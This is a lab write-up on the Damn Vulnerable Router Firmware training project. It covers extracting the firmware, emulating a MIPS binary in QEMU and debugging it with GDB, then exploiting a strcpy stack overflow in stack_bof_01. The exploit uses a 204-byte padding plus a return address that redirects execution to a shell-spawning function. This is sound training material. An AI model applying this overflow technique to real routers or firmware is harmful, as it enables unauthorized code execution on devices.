# Learning with DVRF
The [Damn Vulnerable Router Firmware](https://github.com/praetorian-inc/DVRF) (DVRF) project by [b1ack0wl](https://twitter.com/b1ack0wl) will help you get a good start in understanding mips.<br/>

Download the DVRF project from GitHub:https://github.com/praetorian-inc/DVRF.
<br/>
Open up a Terminal and go to the location with the firmware bin file.
<br/>
We can use binwalk to check out the firmware to get some light details of the file system contained with the .bin file. Let's start with the simple examination with the following command. In Terminal, type in:
```console
➜  DVRF cd Firmware 
➜  Firmware ls -l 
total 8432
-rwxrwxrwx 1 s34s0n s34s0n 7754752 Jan  6 15:17 DVRF_v03.bin
-rwxrwxrwx 1 s34s0n s34s0n  874234 Jan  6 15:17 FW_LICENSE_E1550_v1.0.03.002.html
➜  Firmware binwalk DVRF_v03.bin      

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             BIN-Header, board ID: 1550, hardware version: 4702, firmware version: 1.0.0, build date: 2012-02-08
32            0x20            TRX firmware header, little endian, image size: 7753728 bytes, CRC32: 0x436822F6, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x192708, rootfs offset: 0x0
60            0x3C            gzip compressed data, maximum compression, has original file name: "piggy", from Unix, last modified: 2016-03-09 08:08:31
1648424       0x192728        Squashfs filesystem, little endian, non-standard signature, version 3.0, size: 6099215 bytes, 447 inodes, blocksize: 65536 bytes, created: 2016-03-10 04:34:22


```
From here we can see that there is a Squash file system and that little endian is used for the byte order.
<br/>
Let's extract the firmware to further explore the data within. In Terminal, type in:
```console
$ binwalk -eM DVRF_v03.bin
```

When we do the extraction we can see the same first section as above showing the different parts of the firmware. The second section is new and shows information about the underlying Linux filesystem within the firmware.
```console
Scan Time:     20xx-xx-xx xx:xx:xx
Target File:   /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/piggy
MD5 Checksum:  1fab89cd8929471441d4130a1c2cf477
Signatures:    386

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
3076096       0x2EF000        Linux kernel version 2.6.22
3108912       0x2F7030        CRC32 polynomial table, little endian
3123228       0x2FA81C        CRC32 polynomial table, little endian
3319864       0x32A838        Unix path: /usr/gnemul/irix/
3322560       0x32B2C0        Unix path: /usr/lib/libc.so.1
3422799       0x343A4F        Neighborly text, "NeighborSolicitsts"
3422823       0x343A67        Neighborly text, "NeighborAdvertisementsmp6OutDestUnreachs"
3423024       0x343B30        Neighborly text, "NeighborSolicitsirects"
3423052       0x343B4C        Neighborly text, "NeighborAdvertisementssponses"
3425755       0x3445DB        Neighborly text, "neighbor %.2x%.2x.%.2x:%.2x:%.2x:%.2x:%.2x:%.2x lost on port %d(%s)(%s)"
```

An additional folder has been created in the same directory which contains the extracted contents. Within this new folder, we see the “squashfs-root” folder representing the file system of the firmware. Within this folder, we can see a folder called "pwnable" which have the specific DVRF challenges that we need to solve.

## Buffer Overflow exploitation on MIPS architecture emulated with QEMU by remote debugging with GDB
### Introduction 
This exercise is based on stack_bof_01 (belonging to DVRF). In this case we will try to exploit the Buffer Overflow vulnerability present on the file, due to the usage of the **strcpy** function. The executable **stack_bof_01** is intended for a MIPS architecture, and it is emulated with **qemu-mipsel** by enabling **chroot** command.
#### 1. Analyse the binary
The readme file in the "Intro" directory has specific information about the various challenges that will be solved. Check this file over to see hints about each challenge.<br/>
Now that we know for sure that the underlying byte system is "little endian" from earlier analysis with binwalk, we can check to see if the files are of a MIPS architecture. Open up Terminal and browse to the pwnable directory.
```console
➜  DVRF cd Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro 
➜  Intro ls -l
total 28
-rwxr-xr-x 1 s34s0n s34s0n 7125 Mar 10  2016 heap_overflow_01
-rwxr-xr-x 1 s34s0n s34s0n 1999 Mar 10  2016 README
-rwxr-xr-x 1 s34s0n s34s0n 7016 Mar 10  2016 stack_bof_01
-rwxr-xr-x 1 s34s0n s34s0n 7218 Mar 10  2016 uaf_01
```

To get the specific information about the file, we can use the "file" command. Let's try this on the stack overflow challenge file. In Terminal, type in:
```console
$ file stack_bof_01
```
Here we can see a few interesting pieces of information about this file system and specific architecture information. To verify little endian, we can see the "LSB executable" which stands for least significant byte indicating little endian. We can see the MIPS architecture with the 32-bit version of MIPS. We can also see that the uClibc C library is used.
```console
➜  Intro file stack_bof_01 
stack_bof_01: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, not stripped
```
With the information above, we can go into the next step.
#### 2. Emulate the binary in Qemu virtual environment
Now let’s go back to the **squashfs-root** directory. We need to copy over the appropriate version of Qemu to run the challenges. To do this, we’re going to copy Qemu to the firmware root directory. In Terminal, type in:
```console
$ cp $(which qemu-mipsel-static) ./
```
```console 
➜  squashfs-root cp $(which qemu-mipsel-static) ./
➜  squashfs-root ls -l
total 3420
drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 bin
drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 dev
drwxr-xr-x 3 s34s0n s34s0n    4096 Mar 10  2016 etc
drwxr-xr-x 3 s34s0n s34s0n    4096 Mar 10  2016 lib
lrwxrwxrwx 1 s34s0n s34s0n       9 Jan 23 18:40 media -> tmp/media
drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 mnt
drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 proc
drwxr-xr-x 4 s34s0n s34s0n    4096 Mar 10  2016 pwnable
-rwxr-xr-x 1 s34s0n s34s0n 3451752 Jan 23 20:25 qemu-mipsel-static
drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 sbin
drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 sys
drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 tmp
drwxr-xr-x 6 s34s0n s34s0n    4096 Mar 10  2016 usr
lrwxrwxrwx 1 s34s0n s34s0n       7 Jan 23 18:40 var -> tmp/var
drwxr-xr-x 2 s34s0n s34s0n    4096 Mar 10  2016 www
```

Let’s verify that we can run the challenges with Qemu. We will run the challenge in a “chroot” to contain the challenge. In Terminal, type in:
```console
$ sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 test123
```
 You should see the wrong input that will show the failed message from the challenge.
```console 
➜  squashfs-root sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01 test123
Welcome to the first BoF exercise!

You entered test123 
Try Again
```
####  3. Remote debugging with gdb-multiarch 
The program is emulated again, now with the parameter AAAA and the option "-g 1234", meaning that the file is going to be debugged remotely at port 1234:
```console
$ sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 AAAA
```
Open up another terminal and run the debugger **gdb-multiarch** in a quiet mode (-q):
```console
$ gdb-multiarch ./pwnable/Intro/stack_bof_01 -q
Reading symbols from ./pwnable/Intro/stack_bof_01...(no debugging symbols found)...done.
(gdb) 
```
Setting the architecture option for MIPS:
```console
(gdb) set architecture mips
The target architecture is assumed to be mips
```
The remote target will be the Qemu instance launched before, that is running locally at the port 1234:
```console
(gdb) target remote 127.0.0.1:1234
Remote debugging using 127.0.0.1:1234
warning: remote target does not support file transfer, attempting to access files from local filesystem.
Reading symbols from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...done.
0x7f7b9a80 in _start ()
   from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0
(gdb) 
```
Continuing the execution:
```console
(gdb) c
Continuing.
[Inferior 1 (Remote target) exited with code 0101]
```
The usual output is displayed
```console
$ sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 AAAA
[sudo] password for s34s0n: 
Welcome to the first BoF exercise!

You entered AAAA 
Try Again
```
#### 4. Preparing the attack
Now, in order to prepare the attack, let's examine the functions of the binary. Specifically, because we are interested to control the flow of the program to execute the function dat_shell, let's notice that this function starts at 0x004000950:
```console
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x0040059c  _init
0x00400630  __start
0x00400630  _ftext
0x00400690  __do_global_dtors_aux
0x00400748  frame_dummy
0x004007e0  main
0x00400950  dat_shell
0x004009d0  __do_global_ctors_aux
0x00400a30  strcpy
0x00400a40  printf
0x00400a50  puts
0x00400a60  system
0x00400a70  __uClibc_main
0x00400a80  memset
0x00400a90  exit
```
Also -
```console
(gdb) print dat_shell 
$1 = {<text variable, no debug info>} 0x400950 <dat_shell>
```
In order to overwrite the buffer, let's use a pattern of 300 characters generated by a Perl script like this:<br/>
https://securitythoughts.wordpress.com/2010/03/18/tool-unique-pattern-generator-for-exploit-development/
```console
$ ./pattern.pl 300

Generate/Search Pattern 
Scripted by Wasim Halani (washal)
https://securitythoughts.wordpress.com/
Version 0.2

String is : 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```
Copying the pattern, and pasting it as a parameter to the program:
```console
$ sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```
Debugging again and continuing the execution, there is a segmentation fault at 0x41386740, a non executable area of memory:
```console
(gdb) target remote 127.0.0.1:1234
Remote debugging using 127.0.0.1:1234
Reading symbols from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...done.
0x7f7b9a80 in _start ()
   from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41386741 in ?? ()
(gdb) 
```
As before, the usual message is displayed:
```console
$ sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
[sudo] password for s34s0n: 
Welcome to the first BoF exercise!

You entered Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9 
Try Again
```
Examining the registers, we see that the PC (Program Counter) has been overwritten with the 0x41386741 direction:
```console
(gdb) info registers 
          zero       at       v0       v1       a0       a1       a2       a3
 R0   00000000 fffffff8 00000041 7f7629b8 0000000a 7f7629c3 0000000b 00000000 
            t0       t1       t2       t3       t4       t5       t6       t7
 R8   81010100 7efefeff 41386941 6a413969 316a4130 41326a41 6a41336a 356a4134 
            s0       s1       s2       s3       s4       s5       s6       s7
 R16  00000000 00000000 00000000 ffffffff 7ffff4c4 0040059c 00000002 004007e0 
            t8       t9       k0       k1       gp       sp       s8       ra
 R24  7f6e65e0 7f6ef270 00000000 00000000 00448cd0 7ffff3e8 37674136 41386741 
            sr       lo       hi      bad    cause       pc
      20000010 0000000a 00000000 41386740 00000000 41386741 
           fsr      fir
      00000000 00739300 
(gdb) 
```
Converting the hexadecimal number 0x41386741 into ASCII we get A8gA.After reversing A8gA to Ag8A, locating it into the pattern, there is an offset of 204:
```console
$ ./pattern.pl 300 Ag8A

Generate/Search Pattern 
Scripted by Wasim Halani (washal)
https://securitythoughts.wordpress.com/
Version 0.2

String is : 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Pattern 'Ag8A' found at offset(s) : 204 
```
####  5. Launching the exploitation
The key concept to perform the attack is that the buffer must be rewriten with the first 204 characters (all characters before Ag8A) followed by the address of the function **dat_shell()**
<br/>
Now, creating a new pattern of just 204 characters and copying them:
```console
$ ./pattern.pl 204     

Generate/Search Pattern 
Scripted by Wasim Halani (washal)
https://securitythoughts.wordpress.com/
Version 0.2

String is : 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7
```
This line grows the stack by an unsigned immediate (8) from the current stack pointer memory location (sp) and stores the new memory address in the stack pointer register. In this case, the stack pointer is going to decrease by 8 toward zero.
Instead of choosing the beginning address of **dat_shell()**, let's pick four more advance instructions (0x0040095c). Otherwise the exploit does not work. We needto give the address after function prologue.
```console
(gdb) disas dat_shell 
Dump of assembler code for function dat_shell:
   0x00400950 <+0>:	lui	gp,0x5
   0x00400954 <+4>:	addiu	gp,gp,-31872
   0x00400958 <+8>:	addu	gp,gp,t9
   0x0040095c <+12>:	addiu	sp,sp,-32
   0x00400960 <+16>:	sw	ra,28(sp)
   0x00400964 <+20>:	sw	s8,24(sp)
   0x00400968 <+24>:	move	s8,sp
```
Crafting a new parameter, composed of the 204 set of characters of the pattern, plus echoing 0x0040095c in a **Little Indian** format with option **-e**, to enable the interpretation of backslash escapes.
<br/>
Let's pass the argument to the program:
```console
$ sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7`echo -e '\\x5c\\x09\\x40'`"
```
Remote debugging again and remote debugging again:
```console
(gdb) target remote 127.0.0.1:1234
Remote debugging using 127.0.0.1:1234
Reading symbols from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...done.

Program received signal SIGTRAP, Trace/breakpoint trap.
0x7f7b9a80 in _start ()
   from /home/s34s0n/bi0s/Hardware/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0
(gdb) c
Continuing.
[Inferior 1 (Remote target) exited normally]
(gdb) 
```
At this point the registers PC has been loaded with the function **dat_shell()**.
<br/>
Eventually the buffer overflow attack is successful because dat_shell() function is executed
```console
$ sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7`echo -e '\\x5c\\x09\\x40'`"
Welcome to the first BoF exercise!

You entered Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7\	@ 
Try Again
Congrats! I will now execute /bin/sh
- b1ack0wl
```




`




